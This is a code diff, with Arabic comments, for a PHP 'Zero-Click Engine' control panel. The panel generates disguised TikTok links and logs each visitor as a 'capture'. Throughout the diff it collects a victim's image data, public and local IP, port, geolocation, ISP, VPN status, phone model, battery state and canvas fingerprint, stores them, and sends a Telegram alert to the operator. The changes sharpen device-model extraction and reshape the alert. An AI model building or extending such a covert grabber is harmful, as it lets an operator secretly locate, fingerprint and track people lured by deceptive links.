@@ -173,16 +173,19 @@ function get_ip_details($ip) {
     return ['location' => 'Unknown Location', 'isp' => 'Unknown ISP', 'vpn' => 'Unknown', 'lat' => 0, 'lon' => 0];
 }
 
+// ✅ تحديث دالة استخراج اسم الهاتف لسحب الموديل الحقيقي
 function get_device_type($ua) {
-    if (stripos($ua, 'iPhone') !== false) return 'iPhone - iOS';
-    if (stripos($ua, 'Samsung') !== false) return 'Samsung - Android';
-    if (stripos($ua, 'Xiaomi') !== false || stripos($ua, 'Redmi') !== false) return 'Xiaomi - Android';
-    if (stripos($ua, 'Huawei') !== false) return 'Huawei - Android';
-    if (stripos($ua, 'Oppo') !== false) return 'Oppo - Android';
-    if (stripos($ua, 'Realme') !== false) return 'Realme - Android';
-    if (stripos($ua, 'Android') !== false) return 'Android Device';
-    if (stripos($ua, 'Windows') !== false) return 'PC - Windows';
-    if (stripos($ua, 'Macintosh') !== false) return 'PC - Mac';
+    if (preg_match('/Android\s+[0-9.]+;\s*([^;)]+)/', $ua, $matches)) {
+        $model = trim($matches[1]);
+        if (stripos($model, 'build') !== false) {
+            $model = trim(substr($model, 0, stripos($model, 'build')));
+        }
+        return $model . ' (Android)';
+    }
+    if (stripos($ua, 'iPhone') !== false) return 'iPhone (iOS)';
+    if (stripos($ua, 'iPad') !== false) return 'iPad (iOS)';
+    if (stripos($ua, 'Windows') !== false) return 'PC (Windows)';
+    if (stripos($ua, 'Macintosh') !== false) return 'PC (Mac)';
     return 'Unknown Device';
 }
 
@@ -234,16 +237,15 @@ if (isset($_GET['r'])) {
                 $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, latitude, longitude, gpu_info, battery_info, screen_info, canvas_fp, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                 $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $ip_details['location'], $ip_details['isp'], $ip_details['vpn'], $device, $ip_details['lat'], $ip_details['lon'], $gpu_info, $battery_info, $screen_info, $canvas_fp, date('Y-m-d H:i:s')]);
 
-                // إرسال إشعار تلجرام
+                // ✅ تعديل إشعار التلجرام (حذف الشاشة وكرت الشاشة، إضافة المنفذ والموديل)
                 $msg = "🚨 <b>زيارة جديدة!</b>\n\n";
-                $msg .= "📱 <b>الجهاز:</b> {$device}\n";
+                $msg .= "📱 <b>الموديل:</b> {$device}\n";
                 $msg .= "🌍 <b>الموقع:</b> {$ip_details['location']}\n";
                 $msg .= "📡 <b>الشبكة:</b> {$ip_details['isp']}\n";
                 $msg .= "🔗 <b>الآيبي العام:</b> <code>{$public_ip}</code>\n";
                 $msg .= "🏠 <b>الآيبي المحلي:</b> <code>{$local_ip}</code>\n";
+                $msg .= "🔌 <b>المنفذ:</b> <code>{$port}</code>\n";
                 $msg .= "🔋 <b>البطارية:</b> {$battery_info}\n";
-                $msg .= "🎮 <b>كرت الشاشة:</b> {$gpu_info}\n";
-                $msg .= "🖥 <b>الشاشة:</b> {$screen_info}\n";
                 $msg .= "🔑 <b>بصمة Canvas:</b> <code>{$canvas_fp}</code>\n";
                 sendTelegramNotification($db, $msg);
 
@@ -379,12 +381,6 @@ if (isset($_GET['r'])) {
 // ==========================================
 // لوحة التحكم (Admin)
 // ==========================================
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_tg']) && isset($_SESSION['is_logged_in'])) {
-    $db->prepare("INSERT INTO settings (key, value) VALUES ('tg_token', ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value")->execute([trim($_POST['tg_token'])]);
-    $db->prepare("INSERT INTO settings (key, value) VALUES ('tg_chat', ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value")->execute([trim($_POST['tg_chat'])]);
-    header("Location: /?msg=saved"); exit();
-}
-
 if (isset($_GET['delete_id']) && isset($_SESSION['is_logged_in'])) {
     $db->prepare("DELETE FROM captures WHERE id = ?")->execute([intval($_GET['delete_id'])]);
     header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
@@ -406,9 +402,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create']) && isset($_
     $generated_code = $code;
 }
 
-$tg_token = $db->query("SELECT value FROM settings WHERE key = 'tg_token'")->fetchColumn();
-$tg_chat = $db->query("SELECT value FROM settings WHERE key = 'tg_chat'")->fetchColumn();
-
 $total_links = $db->query("SELECT COUNT(*) FROM links")->fetchColumn();
 $total_captures = $db->query("SELECT COUNT(*) FROM captures")->fetchColumn();
 $today_captures = $db->query("SELECT COUNT(*) FROM captures WHERE date(created_at) = date('now')")->fetchColumn();
@@ -427,7 +420,7 @@ $captures = $stmt->fetchAll();
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Control Panel - V9</title>
+    <title>Control Panel - V10</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
@@ -510,7 +503,7 @@ $captures = $stmt->fetchAll();
         <div class="header-flex">
             <div>
                 <h1>Control Panel</h1>
-                <p class="subtitle">Zero-Click Engine V9 (Telegram + Fingerprint)</p>
+                <p class="subtitle">Zero-Click Engine V10 (Custom Fields)</p>
             </div>
             <div style="text-align: left;">
                 <div class="live-badge"><div class="live-dot"></div> SYSTEM ONLINE</div>
@@ -534,17 +527,6 @@ $captures = $stmt->fetchAll();
                 <div class="stat-card"><h3>Today's Captures</h3><p style="color: #10b981; -webkit-text-fill-color: #10b981;"><?php echo $today_captures; ?></p></div>
             </div>
             <div style="text-align: right; margin-bottom: -10px;"><a href="?logout=1" class="btn btn-danger" style="height: 38px; padding: 0 16px; font-size: 12px;">تسجيل الخروج</a></div>
-
-            <!-- إعدادات تلجرام -->
-            <div class="section-box">
-                <h2>⚙️ إعدادات إشعارات تلجرام</h2>
-                <form method="POST" class="form-grid" style="grid-template-columns: 1fr 1fr auto;">
-                    <input type="text" name="tg_token" placeholder="Bot Token" value="<?php echo htmlspecialchars($tg_token); ?>">
-                    <input type="text" name="tg_chat" placeholder="Chat ID" value="<?php echo htmlspecialchars($tg_chat); ?>">
-                    <button type="submit" name="save_tg" class="btn btn-success">حفظ الإعدادات</button>
-                </form>
-                <p style="font-size: 11px; color: var(--muted); margin-top: 10px;">* تم دمج التوكن والـ ID الخاص بك تلقائياً في الكود. يمكنك تغييرهما من هنا في أي وقت.</p>
-            </div>
 
             <div class="section-box">
                 <h2>Generate TikTok Link</h2>
@@ -601,10 +583,10 @@ $captures = $stmt->fetchAll();
                                 <div class="info-row"><span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span></div>
                                 <div class="info-row"><span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span></div>
                                 <div class="info-row"><span>ISP:</span> <span style="color:#f97316; font-weight: bold;"><?php echo htmlspecialchars($cap['isp_info']); ?></span></div>
-                                <div class="info-row"><span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span></div>
                                 
-                                <div class="info-row" style="background: rgba(139, 92, 246, 0.1); padding: 4px; border-radius: 4px; margin-top: 8px;"><span>GPU:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['gpu_info']); ?></span></div>
-                                <div class="info-row"><span>Screen:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['screen_info']); ?></span></div>
+                                <!-- ✅ تم استبدال كرت الشاشة والشاشة بالمنفذ والموديل -->
+                                <div class="info-row" style="background: rgba(139, 92, 246, 0.1); padding: 4px; border-radius: 4px; margin-top: 8px;"><span>Port:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['port']); ?></span></div>
+                                <div class="info-row"><span>Device:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['device_info']); ?></span></div>
                                 <div class="info-row"><span>Battery:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['battery_info']); ?></span></div>
                                 <div class="info-row"><span>Fingerprint:</span> <span style="color:#a78bfa; font-family: monospace;"><?php echo htmlspecialchars($cap['canvas_fp']); ?></span></div>
 
